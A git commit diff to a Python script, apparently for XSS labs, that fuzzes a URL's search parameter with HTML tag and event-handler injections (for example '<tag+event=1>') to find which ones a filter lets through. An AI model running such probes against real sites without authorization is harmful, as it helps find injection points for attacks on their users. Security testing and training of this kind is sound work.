61fed7823bd2075deff2b94be8441a3d5915f1b6
Neo-Izumi <doanhthinhai@gmail.com>
2023-03-13 09:59:01 +0700

    Block some tags and href attr from <a> tag

--- XSS Script/check_tags_events.py
+++ XSS Script/check_tags_events.py
@@ -7,37 +7,38 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
 
 ftag = open("tags.txt", "r")
-fevent = open("events.txt", "r")
 
 def bf_tag(url):
+    print("(+) Retrieving tags: ")
     for tag in ftag:
         tag = tag.strip("\n")
         inject = url + f"?search=<{tag}>"
         r = requests.get(inject)
         if r.status_code == 200:
-            print("Tag: " + tag)
-            return tag
+            print("Tag allowed: " + tag)
+            print("\t(+) Retrieving events: ")
+            fevent = open("events.txt", "r")
+            bf_event(url, tag, fevent)
+            fevent.close()
+            print("(+) Retrieving tags: ")
         else:
             print(tag)
     return None
             
-def bf_event(url, tag):
+def bf_event(url, tag, fevent):
     for event in fevent:
         event = event.strip("\n")
         inject = url + f"?search=<{tag}+{event}=1>"
         r = requests.get(inject)
         if r.status_code == 200:
-            print("Event: " + event)
-            return event
+            print("\tEvent allowed: " + event)
         else:
-            print(event)
+            print("\t" + event)
     return None
 
 def main():
-    url = input("Enter an URL here: ")
-    tag = bf_tag(url)
-    event = bf_event(url, tag)
-    print("Tag: " + tag + " Event: " + event)
+    url = input("(+) Enter an URL here: ")
+    bf_tag(url)
 
 if __name__ == "__main__":
     main()
